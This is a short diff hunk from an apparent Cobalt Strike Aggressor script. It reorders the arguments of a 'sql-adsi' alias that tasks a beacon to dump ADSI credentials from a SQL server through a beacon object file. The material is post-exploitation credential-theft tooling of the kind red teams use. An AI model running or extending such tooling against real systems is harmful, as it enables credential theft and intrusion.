@@ -743,7 +743,7 @@ alias sql-adsi {
     
 	btask($1, "Tasked beacon to dump ADSI creds on " . $server);
 	
-	$args = bof_pack($1, "zzzzzz", $server, $adsiserver, $port, $database, $link, $impersonate);
+	$args = bof_pack($1, "zzzzzz", $server, $database, $link, $impersonate, $adsiserver, $port);
 	beacon_inline_execute($1, readbof($1, "adsi"), "go", $args);
 }
 
